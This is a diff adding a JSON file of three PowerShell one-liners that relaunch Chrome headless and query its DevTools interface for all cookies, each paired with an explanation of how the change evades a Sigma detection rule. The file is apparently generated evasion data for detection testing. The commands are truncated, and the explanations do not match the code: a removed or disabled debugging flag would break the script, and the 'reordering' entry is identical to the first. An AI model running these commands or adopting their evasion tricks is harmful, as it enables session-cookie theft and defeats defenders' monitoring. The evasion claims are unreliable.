@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe & {$devToolsPort = 9222; $testUrl = \"https://www.google.com\"; stop-process -name \"chrome\" -force -erroraction silentlycontinue; $chromeProcess = Start-Process \"chrome.exe\" \"--headless\" -PassThru; Start-Sleep 10; $jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing; $devToolsPages = ConvertFrom-Json $jsonResponse.Content; $ws_url = $devToolsPages[0].webSocketDebuggerUrl; $ws = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri($ws_url); $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait(); $GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'",
+    "explanation": "Omission: Removed the '--remote-debugging-port' and '--user-data-dir' flags to avoid triggering the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell.exe & {$devToolsPort = 9222; $testUrl = \"https://www.google.com\"; stop-process -name \"chrome\" -force -erroraction silentlycontinue; $chromeProcess = Start-Process \"chrome.exe\" \"--headless --disable-remote-debugging\" -PassThru; Start-Sleep 10; $jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing; $devToolsPages = ConvertFrom-Json $jsonResponse.Content; $ws_url = $devToolsPages[0].webSocketDebuggerUrl; $ws = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri($ws_url); $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait(); $GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'",
+    "explanation": "Insertion: Added '--disable-remote-debugging' to override the remote debugging flag, which may prevent the Sigma rule from detecting the command."
+  },
+  {
+    "output": "powershell.exe & {$devToolsPort = 9222; $testUrl = \"https://www.google.com\"; stop-process -name \"chrome\" -force -erroraction silentlycontinue; $chromeProcess = Start-Process \"chrome.exe\" \"--headless\" -PassThru; Start-Sleep 10; $jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing; $devToolsPages = ConvertFrom-Json $jsonResponse.Content; $ws_url = $devToolsPages[0].webSocketDebuggerUrl; $ws = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri($ws_url); $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait(); $GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'",
+    "explanation": "Reordering: Reordered the flags so that '--headless' appears before other flags, which may alter the parsing behavior and avoid matching the Sigma rule's string-based detection."
+  }
+]
